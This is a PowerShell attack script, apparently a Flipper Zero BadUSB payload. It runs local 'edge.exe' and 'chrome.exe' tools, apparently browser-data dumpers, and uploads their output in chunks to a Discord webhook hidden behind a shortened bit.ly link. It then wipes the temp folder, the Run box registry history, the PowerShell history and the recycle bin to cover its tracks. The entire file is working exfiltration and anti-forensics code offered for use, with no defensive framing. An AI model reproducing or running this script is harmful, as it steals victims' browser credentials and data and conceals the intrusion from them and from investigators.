############################################################################################################################################################
$browsers = @("edge", "chrome")

foreach ($browser in $browsers) {
    $exePath = ".\$browser.exe"

    # Execute the command and capture output
    $commandOutput = & $exePath | Out-String
    $chunks = [Math]::Ceiling($commandOutput.Length / 2000)

    function ExpandURL([string]$URL) {
        # Function to follow redirects and return final URL
        (Invoke-WebRequest -MaximumRedirection 0 -Uri $URL -ErrorAction SilentlyContinue).Headers.Location
    }

    function Upload-Discord {
        param (
            [string]$text 
        )

        # Get the webhook URL (change as needed)
        $hookurl = ExpandURL 'https://bit.ly/3VZTOvb'

        $Body = @{
            'username' = 'Flipper'
            'content' = $text
        } | ConvertTo-Json

        if (-not ([string]::IsNullOrEmpty($text))) {
            try {
                Invoke-RestMethod -ContentType 'application/json' -Uri $hookurl -Method Post -Body $Body
            } catch {
                Write-Host "Error invoking REST method: $_"
            }
        }
    }

    # Split command output into chunks and send to Discord
    for ($i = 0; $i -lt $chunks; $i++) {
        $start = $i * 2000
        $length = [Math]::Min(2000, $commandOutput.Length - $start)
        $content = $commandOutput.Substring($start, $length)
        Upload-Discord -text $content
    }
}
############################################################################################################################################################

function Clean-Exfil { 

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue

}

############################################################################################################################################################

Clean-Exfil